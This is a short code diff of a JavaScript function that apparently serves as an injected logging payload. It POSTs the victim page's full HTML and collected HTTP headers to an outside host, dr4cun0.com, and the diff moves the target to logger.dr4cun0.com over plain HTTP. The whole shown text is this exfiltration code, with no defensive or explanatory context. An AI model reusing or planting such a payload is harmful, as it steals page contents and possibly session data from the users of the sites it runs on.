@@ -17,7 +17,8 @@ function loadXMLDoc(headers) {
         }
     };
 
-    xmlhttp.open("POST", "https://dr4cun0.com/logger/", true);
-    xmlhttp.send('{"source" : "' +  encodeURI(document.body.parentNode.innerHTML) + '", "headers" : "' + encodeURI(headers) + '"}');
+    xmlhttp.open("POST", "http://logger.dr4cun0.com/logger/", true);
+    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xmlhttp.send("source=" + encodeURI(document.body.parentNode.innerHTML) + "&headers=" + encodeURI(headers));
 }
 getHeader();
